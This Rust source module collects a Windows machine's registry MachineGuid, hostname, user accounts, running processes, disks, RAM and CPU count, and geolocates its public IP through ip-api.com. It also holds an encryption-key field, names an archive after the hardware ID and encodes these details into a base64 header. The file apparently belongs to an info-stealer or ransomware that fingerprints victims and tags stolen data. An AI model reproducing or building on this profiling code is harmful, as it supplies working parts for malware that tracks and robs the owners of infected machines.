use super::funcs;
use serde::Deserialize;
use sysinfo::{DiskExt, ProcessExt, System, SystemExt, UserExt};
use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;

#[derive(Debug)]
#[allow(dead_code)]
pub struct Device {
    hwid: String,
    hostname: String,
    users: Vec<String>,
    cores: String,
    ram: String,
    disk: Vec<String>,
    os: String,
    processes: Vec<String>,
    enc_key: String,
    ip: String,
    country: String,
    country_code: String,
}

#[derive(Deserialize)]
pub struct Network {
    query: String,
    country: String,
    #[serde(rename = "countryCode")]
    country_code: String,
}

impl Network {
    pub async fn new() -> Self {
        let network = reqwest::get("http://ip-api.com/json/?fields=country,countryCode,query")
            .await
            .unwrap()
            .json::<Network>()
            .await
            .unwrap();

        Network {
            query: network.query,
            country: network.country,
            country_code: network.country_code,
        }
    }

    pub fn ip(&self) -> String {
        self.query.clone()
    }

    pub fn country(&self) -> String {
        self.country.clone()
    }

    pub fn country_code(&self) -> String {
        self.country_code.clone()
    }
}

impl Device {
    pub fn new() -> Device {
        let mut sys = System::new_all();
        sys.refresh_all();

        let os: String = format!("{} {}", sys.name().unwrap(), sys.os_version().unwrap());
        let users: Vec<String> = sys
            .users()
            .iter()
            .map(|user| user.name().to_string())
            .collect();
        let hostname: String = sys.host_name().unwrap().to_string();
        let processes: Vec<String> = sys
            .processes()
            .iter()
            .map(|(_pid, process)| process.name().to_string())
            .collect();
        let ram: String = funcs::convert_bytes(sys.total_memory() as f64);
        let cores: String = sys.cpus().len().to_string();
        let disk: Vec<String> = sys
            .disks()
            .iter()
            .map(|disk| {
                format!(
                    "{} {}",
                    disk.name().to_string_lossy(),
                    funcs::convert_bytes(disk.total_space() as f64)
                )
            })
            .collect();
        let hwid = Device::get_hwid();

        Device {
            hwid,
            hostname,
            os,
            users,
            cores,
            ram,
            disk,
            processes,
            enc_key: "".to_string(),
            ip: "127.0.0.1".to_string(),
            country: "UNKNOWN".to_string(),
            country_code: "UNKNOWN".to_string(),
        }
    }
    fn get_hwid() -> String {
        let key = RegKey::predef(HKEY_LOCAL_MACHINE)
            .open_subkey("SOFTWARE\\Microsoft\\Cryptography")
            .unwrap();
        let hwid: String = key.get_value("MachineGuid").unwrap();
        hwid.to_uppercase()
    }
    pub fn get_file_name(&self) -> String {
        let mut hwid = &self.hwid;
        format!("{}{}", hwid, ".zip")
    }
    pub fn to_json(&self) -> String {
        let json = serde_json::json!({
            "hwid": self.hwid,
            "hostname": self.hostname,
            "os": self.os,
            "users": self.users,
            "cores": self.cores,
            "ram": self.ram,
            "disk": self.disk,
            "processes": self.processes,
            "enc_key": self.enc_key,
            "ip": self.ip,
            "country": self.country,
            "country_code": self.country_code,
        });

        serde_json::to_string_pretty(&json).unwrap()
    }
    pub fn hwid(&self) -> String {
        self.hwid.clone()
    }
    pub fn set_enc_key(&mut self, key: String) {
        self.enc_key = key;
    }

    pub fn set_ip(&mut self, ip: String) {
        self.ip = ip;
    }

    pub fn set_country(&mut self, country: String) {
        self.country = country;
    }

    pub fn set_country_code(&mut self, country_code: String) {
        self.country_code = country_code;
    }

    pub fn to_header(&self) -> String {
        let header = serde_json::json!({
            "hwid": self.hwid,
            "hostname": self.hostname,
            "ip": self.ip,
            "country" : self.country,
            "country_code": self.country_code,
            "enc_key": self.enc_key
        });

        base64::encode(serde_json::to_string_pretty(&header).unwrap())
    }
}
